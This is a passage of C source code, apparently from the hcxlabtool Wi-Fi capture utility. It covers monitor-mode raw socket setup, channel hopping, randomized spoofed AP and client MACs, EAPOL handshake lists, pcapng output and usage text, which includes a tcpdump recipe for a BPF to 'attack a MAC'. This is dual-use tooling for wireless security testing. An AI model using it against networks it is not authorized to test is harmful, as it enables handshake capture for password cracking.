sleepled.tv_nsec = GPIO_LED_DELAY;
tsfd.tv_sec = FDTIMER;
tsfd.tv_nsec = 0;
csc = 0;
if(set_channel() == false) return;
while(wantstopflag == false)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) wantstopflag = true;
		}
	if(errorcount > ERROR_MAX) wantstopflag = true;
	gettimeofday(&tv, NULL);
	if((tv.tv_sec -tvold.tv_sec) >= staytime)
		{
		tvold.tv_sec = tv.tv_sec;
		if(gpiostatusled > 0)
			{
			GPIO_SET = 1 << gpiostatusled;
			nanosleep(&sleepled, NULL);
			GPIO_CLR = 1 << gpiostatusled;
			if((tv.tv_sec - tvlast.tv_sec) > WATCHDOG)
				{
				nanosleep(&sleepled, NULL);
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		set_channel();
		csc++;
		if(channelscanlist[csc] == 0) csc = 0;
		}
	FD_ZERO(&readfds);
	sd_socket = fd_socket;
	FD_SET(sd_socket, &readfds);
	fdnum = pselect(sd_socket +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	sd_socket = fd_socket;
	if(FD_ISSET(sd_socket, &readfds)) process_packet();
	}
return;
}
/*===========================================================================*/
static inline void fdloop()
{
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static struct timespec sleepled;

fprintf(stdout, "%s entered loop on channel %d\n", ifname, channelscanlist[0]);
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
tsfd.tv_sec = FDTIMER;
tsfd.tv_nsec = 0;
csc = 0;
if(set_channel() == false) return;
while(wantstopflag == false)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) wantstopflag = true;
		}
	if(errorcount > ERROR_MAX) wantstopflag = true;
	gettimeofday(&tv, NULL);
	if((tv.tv_sec -tvold.tv_sec) >= 10)
		{
		tvold.tv_sec = tv.tv_sec;
		if(gpiostatusled > 0)
			{
			GPIO_SET = 1 << gpiostatusled;
			nanosleep(&sleepled, NULL);
			GPIO_CLR = 1 << gpiostatusled;
			if((tv.tv_sec - tvlast.tv_sec) > WATCHDOG)
				{
				nanosleep(&sleepled, NULL);
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		}
	FD_ZERO(&readfds);
	sd_socket = fd_socket;
	FD_SET(sd_socket, &readfds);
	fdnum = pselect(sd_socket +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	sd_socket = fd_socket;
	if(FD_ISSET(sd_socket, &readfds)) process_packet();
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void emptyloop()
{
static struct timespec sleepled;

sleepled.tv_sec = 5;
sleepled.tv_nsec = 0;
while(wantstopflag == false)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) break;
		}
	if(gpiostatusled > 0)
		{
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		}
	nanosleep(&sleepled, NULL);
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL)) wantstopflag = true;
return;
}
/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if (*ptr != '\n') break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if (*ptr != '\r') break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream)) return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL) return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void getscanlist()
{
static int c;
static int cgc;
static struct iwreq pwrq;

cgc = 0;
for(c = 1; c < 256; c++)
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 0;
	if(ioctl(fd_socket , SIOCSIWFREQ, &pwrq) < 0) continue;
	if(c == 14) continue;
	channelscanlist[cgc] = c;
	cgc++;
	}
channelscanlist[cgc] = 0;
return;
}
/*===========================================================================*/
static inline bool opensocket(char *interfacename)
{
static int fd_info;
static struct ifaddrs *ifaddr = NULL;
static struct ifaddrs *ifa = NULL;
static struct iwreq iwrinfo, iwr;
static struct iw_param param;
static struct ifreq ifr;
static struct sockaddr_ll ll;
static struct packet_mreq mr;
static struct ethtool_perm_addr *epmaddr;

if(interfacename != NULL) strncpy(ifname, interfacename, IFNAMSIZ);
else
	{
	if(getifaddrs(&ifaddr) == -1) return false;
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
			if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) != -1)
				{
				memcpy(ifname, ifa->ifa_name, IFNAMSIZ);
				memset(&iwrinfo, 0, sizeof(iwr));
				memcpy(&iwrinfo.ifr_name, ifa->ifa_name, IFNAMSIZ);
				if(ioctl(fd_info, SIOCGIWNAME, &iwrinfo) != -1) break;
				}
			}
		}
	freeifaddrs(ifaddr);
	}
if((fd_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) return false;
	{
	if(bpf.len > 0) if(setsockopt(fd_socket, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) return false;
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) return false;
	memset(&iwr, 0, sizeof(iwr));
	iwr.u.mode = IW_MODE_MONITOR;
	memcpy(&iwr.ifr_name, ifname, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCSIWMODE, &iwr) < 0) return false;

	memset(&iwr, 0, sizeof(iwr));
	memcpy(&iwr.ifr_name, ifname, IFNAMSIZ);
	memset(&param,0 , sizeof(param));
	iwr.u.data.pointer = &param;
	ioctl(fd_socket, SIOCSIWPOWER, &iwr);

	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) return false;

	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
	ifr.ifr_flags = 0;
	if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0) return false;
	memset(&ll, 0, sizeof(ll));
	ll.sll_family = PF_PACKET;
	ll.sll_ifindex = ifr.ifr_ifindex;
	ll.sll_protocol = htons(ETH_P_ALL);
	ll.sll_halen = ETH_ALEN;
	ll.sll_pkttype = PACKET_OTHERHOST | PACKET_OUTGOING;
	if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0) return false;

	memset(&mr, 0, sizeof(mr));
	mr.mr_ifindex = ifr.ifr_ifindex;
	mr.mr_type = PACKET_MR_PROMISC;
	if(setsockopt(fd_socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0) return false;

	epmaddr = (struct ethtool_perm_addr*)calloc(1, sizeof(struct ethtool_perm_addr) +6);
	if(!epmaddr) return false;
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
	epmaddr->cmd = ETHTOOL_GPERMADDR;
	epmaddr->size = 6;
	ifr.ifr_data = (char*)epmaddr;
	if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0) return false;
	if(epmaddr->size != 6) return false;
	memcpy(ifmac, epmaddr->data, 6);
	free(epmaddr);
	}
return true;
}
/*===========================================================================*/
static inline void readbpfc(char *bpfname)
{
static int len;
static uint16_t c;
static struct sock_filter *zeiger;
static FILE *fh_filter;
static char linein[128];

if((fh_filter = fopen(bpfname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open Berkeley Packet Filter list %s\n", bpfname);
	return;
	}
if((len = fgetline(fh_filter, 128, linein)) == -1)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
sscanf(linein, "%"SCNu16, &bpf.len);
if(bpf.len == 0)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
bpf.filter = (struct sock_filter*)calloc(bpf.len, sizeof(struct sock_filter));
c = 0;
zeiger = bpf.filter;
while(c < bpf.len)
	{
	if((len = fgetline(fh_filter, 128, linein)) == -1)
		{
		bpf.len = 0;
		break;
		}
	sscanf(linein, "%" SCNu16 "%" SCNu8 "%" SCNu8 "%" SCNu32, &zeiger->code, &zeiger->jt,  &zeiger->jf,  &zeiger->k);
	zeiger++;
	c++;
	}
if(bpf.len != c) fprintf(stderr, "failed to read Berkeley Packet Filter\n");
fclose(fh_filter);
return;
}
/*===========================================================================*/
static inline bool initgpio(int gpioperi)
{
static int fd_mem;

fd_mem = open("/dev/mem", O_RDWR|O_SYNC);
if(fd_mem < 0)
	{
	fprintf(stderr, "failed to get device memory\n");
	return false;
	}
gpio_map = mmap(NULL, BLOCK_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_mem, GPIO_BASE +gpioperi);
close(fd_mem);
if(gpio_map == MAP_FAILED)
	{
	fprintf(stderr, "failed to map GPIO memory\n");
	return false;
	}
gpio = (volatile unsigned *)gpio_map;
return true;
}
/*===========================================================================*/
static inline int getrpirev()
{
static FILE *fh_rpi;
static int len;
static int rpi = 0;
static int rev = 0;
static int gpioperibase = 0;
static char *revptr = NULL;
static const char *revstr = "Revision";
static const char *hwstr = "Hardware";
static const char *snstr = "Serial";
static char linein[128];

fh_rpi = fopen("/proc/cpuinfo", "r");
if(fh_rpi == NULL)
	{
	perror("failed to retrieve cpuinfo");
	return gpioperibase;
	}
while(1)
	{
	if((len = fgetline(fh_rpi, 128, linein)) == -1) break;
	if(len < 15) continue;
	if(memcmp(&linein, hwstr, 8) == 0)
		{
		rpi |= 1;
		continue;
		}
	if(memcmp(&linein, revstr, 8) == 0)
		{
		rpirevision = strtol(&linein[len -6], &revptr, 16);
		if((revptr - linein) == len)
			{
			rev = (rpirevision >> 4) &0xff;
			if(rev <= 3)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if(rev == 0x09)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if(rev == 0x0c)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if((rev == 0x04) || (rev == 0x08) || (rev == 0x0d) || (rev == 0x0e) || (rev == 0x11) || (rev == 0x13))
				{
				gpioperibase = GPIO_PERI_BASE_NEW;
				rpi |= 2;
				continue;
				}
			continue;
			}
		rpirevision = strtol(&linein[len -4], &revptr, 16);
		if((revptr - linein) == len)
			{
			if((rpirevision < 0x02) || (rpirevision > 0x15)) continue;
			if((rpirevision == 0x11) || (rpirevision == 0x14)) continue;
			gpioperibase = GPIO_PERI_BASE_OLD;
			rpi |= 2;
			}
		continue;
		}
	if(memcmp(&linein, snstr, 6) == 0)
		{
		rpi |= 4;
		continue;
		}
	}
fclose(fh_rpi);
if(rpi < 0x7) return 0;
return gpioperibase;
}
/*===========================================================================*/
static inline bool openpcapng()
{
static char timestring[16];
static char filename[PATH_MAX];

strftime(timestring, PATH_MAX, "%Y%m%d%H%M%S", localtime(&tv.tv_sec));
snprintf(filename, PATH_MAX, "%s-%s", timestring, ifname);
fd_pcapng = hcxcreatepcapngdump(filename, ifmac, ifname, macrgap, rgrc, anonce, macrgclient, snonce, 8, "12345678");
if(fd_pcapng == -1) return false;
return true;
}
/*===========================================================================*/
static inline bool globalinit()
{
static int c;
static int gpiobasemem = 0;

gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tvlast.tv_sec = tv.tv_sec;
tvlast.tv_sec = tv.tv_sec;
mytime = 1;
srand(time(NULL));
if((gpiobutton > 0) || (gpiostatusled > 0))
	{
	if(gpiobutton == gpiostatusled)
		{
		fprintf(stderr, "same value for wpi_button and wpi_statusled is not allowed\n");
		return false;
		}
	gpiobasemem = getrpirev();
	if(gpiobasemem == 0)
		{
		fprintf(stderr, "failed to locate GPIO\n");
		return false;
		}
	if(initgpio(gpiobasemem) == false)
		{
		fprintf(stderr, "failed to init GPIO\n");
		return false;
		}
	if(gpiostatusled > 0)
		{
		INP_GPIO(gpiostatusled);
		OUT_GPIO(gpiostatusled);
		}
	if(gpiobutton > 0)
		{
		INP_GPIO(gpiobutton);
		}
	}
errorcount = 0;
deauthenticationsequence = 1;
clientsequence = 1;
apsequence = 1;

memset(&bpf, 0, sizeof(bpf));
memset(&ifname, 0 , sizeof(ifname));
memset(&ifmac, 0 , sizeof(ifmac));

ouirgap = (myvendorap[rand() %((MYVENDORAP_SIZE /sizeof(int)))]) &0xfcffff;
nicrgap = (rand() & 0x0fffff);
macrgap[5] = nicrgap & 0xff;
macrgap[4] = (nicrgap >> 8) & 0xff;
macrgap[3] = (nicrgap >> 16) & 0xff;
macrgap[2] = ouirgap & 0xff;
macrgap[1] = (ouirgap >> 8) & 0xff;
macrgap[0] = (ouirgap >> 16) & 0xff;

ouirgclient = (myvendorclient[rand() %((MYVENDORCLIENT_SIZE /sizeof(int)))]) &0xffffff;
nicrgclient = rand() & 0xffffff;
macrgclient[5] = nicrgclient & 0xff;
macrgclient[4] = (nicrgclient >> 8) & 0xff;
macrgclient[3] = (nicrgclient >> 16) & 0xff;
macrgclient[2] = ouirgclient & 0xff;
macrgclient[1] = (ouirgclient >> 8) & 0xff;
macrgclient[0] = (ouirgclient >> 16) & 0xff;

for(c = 0; c < 32; c++)
	{
	anonce[c] = rand() %0xff;
	snonce[c] = rand() %0xff;
	}
rgrc = (rand()%0xfff) +0xf000;
if((aplist = (aplist_t*)calloc((APLIST_MAX +1), APLIST_SIZE)) == NULL) return false;
if((rgaplist = (rgaplist_t*)calloc((RGAPLIST_MAX +1), RGAPLIST_SIZE)) == NULL) return false;
if((eapolm1list = (eapollist_t*)calloc((EAPOLLIST_MAX +1), EAPOLLIST_SIZE)) == NULL) return false;
if((eapolm2list = (eapollist_t*)calloc((EAPOLLIST_MAX +1), EAPOLLIST_SIZE)) == NULL) return false;
if((eapolm3list = (eapollist_t*)calloc((EAPOLLIST_MAX +1), EAPOLLIST_SIZE)) == NULL) return false;

wantstopflag = false;
signal(SIGINT, programmende);
return true;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSIONTAG, VERSIONYEAR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
printf("%s %s  (C) %s ZeroBeat\n"
	"usage  : %s <options>\n"
	"\n"
	"short options:\n"
	"-i <interface> : interface (monitor mode will be enabled by hcxlabtool)\n"
	"                 default: first discovered interface\n"
	"-c <digit>     : set channel (1,2,3, ...)\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n"
	"long options:\n"
	"--gpio_button=<digit>     : Raspberry Pi GPIO pin number of button (2...27)\n"
	"                            default = GPIO not in use\n"
	"--gpio_statusled=<digit>  : Raspberry Pi GPIO number of status LED (2...27)\n"
	"                            default = GPIO not in use\n"
	"--bpfc=<file>             : input kernel space Berkeley Packet Filter (BPF) code\n"
	"                            affected: incoming and outgoing traffic - that include rca scan\n"
	"                            steps to create a BPF (it only has to be done once):\n"
	"                             set hcxdumptool monitormode\n"
	"                             $ hcxumptool -m <interface>\n"
	"                             create BPF to protect a MAC\n"
	"                             $ tcpdump -i <interface> not wlan addr1 11:22:33:44:55:66 and not wlan addr2 11:22:33:44:55:66 -ddd > protect.bpf\n"
	"                             recommended to protect own devices\n"
	"                             or create BPF to attack a MAC\n"
	"                             $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 -ddd > attack.bpf\n"
	"                             not recommended, because important pre-authentication frames will be lost due to MAC randomization of the CLIENTs\n"
	"                             use the BPF code\n"
	"                             $ hcxumptool --bpfc=attack.bpf ...\n"
	"                             notice: this is a protect/attack, a capture and a display filter\n"
	"                             see man pcap-filter for a list of all filter options\n"
	"--help                    : show this help\n"
	"--version                 : show version\n",
	eigenname, VERSIONTAG, VERSIONYEAR, eigenname);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSIONTAG, VERSIONYEAR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int index;
static char *interfacename;
static char *bpfcname;
static char *userscanlist;
static char *tokptr;
static int cgc;

static const char *short_options = "i:c:t:hv";
static const struct option long_options[] =
{
	{"gpio_button",			required_argument,	NULL,	HCX_GPIO_BUTTON},
	{"gpio_statusled",		required_argument,	NULL,	HCX_GPIO_STATUSLED},
	{"bpfc",			required_argument,	NULL,	HCX_BPFC},
	{"version",			no_argument,		NULL,	HCX_VERSION},
	{"help",			no_argument,		NULL,	HCX_HELP},
	{NULL,				0,			NULL,	0}
};

auswahl = -1;
index = 0;
optind = 1;
optopt = 0;
gpiobutton = 0;
gpiostatusled = 0;
interfacename = NULL;
bpfcname = NULL;
staytime = STAYTIME;
cgc = 3;
channelscanlist[0] = 1;
channelscanlist[1] = 6;
channelscanlist[2] = 11;
channelscanlist[3] = 0;

while((auswahl = getopt_long(argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case HCX_INTERFACE_NAME:
		interfacename = optarg;
		break;

		case HCX_CHANNEL:
		cgc = 0;
		userscanlist = strdupa(optarg);
		tokptr = strtok(userscanlist, ",");
		while((tokptr != NULL) && (cgc < 256))
			{
			channelscanlist[cgc] = atoi(tokptr);
			tokptr = strtok(NULL, ",");
			cgc++;
			}
		channelscanlist[cgc] = 0;
		break;

		case HCX_STAYTIME:
		staytime = strtol(optarg, NULL, 10);
		if(staytime < 2)
			{
			fprintf(stderr, "stay time must be >= 2\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_BUTTON:
		gpiobutton = strtol(optarg, NULL, 10);
		if((gpiobutton < 2) || (gpiobutton > 27))
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		if(gpiostatusled == gpiobutton)
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_STATUSLED:
		gpiostatusled = strtol(optarg, NULL, 10);
		if((gpiostatusled < 2) || (gpiostatusled > 27))
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		if(gpiostatusled == gpiobutton)
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_BPFC:
		bpfcname = optarg;
		break;

		case HCX_HELP:
		usage(basename(argv[0]));
		break;

		case HCX_VERSION:
		version(basename(argv[0]));
		break;

		case '?':
		usageerror(basename(argv[0]));
		break;
		}
	}
setbuf(stdout, NULL);
if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	exit(EXIT_FAILURE);
	}

if(globalinit() == false)
	{
	fprintf(stderr, "global inti failed\n");
	exit(EXIT_FAILURE);
	}

if(bpfcname != NULL) readbpfc(bpfcname);
if((bpfcname != NULL) && (bpf.len == 0)) fprintf(stderr, "BPF code not loaded\n");
if(opensocket(interfacename) == false)
	{
	fprintf(stderr, "open socket failed\n");
	exit(EXIT_FAILURE);
	}

if(openpcapng() == false)
	{
	fprintf(stderr, "open pcapng file failed\n");
	exit(EXIT_FAILURE);
	}

if(cgc > 1) fdloopscan();
else fdloop();

globalclose();
fprintf(stdout, "\n%d error(s) encountered\n", errorcount);

if(gpiobutton != 0)
	{
	if(system("poweroff") != 0) fprintf(stderr, "can't power off\n");
	}
return EXIT_SUCCESS;
}
/*===========================================================================*/
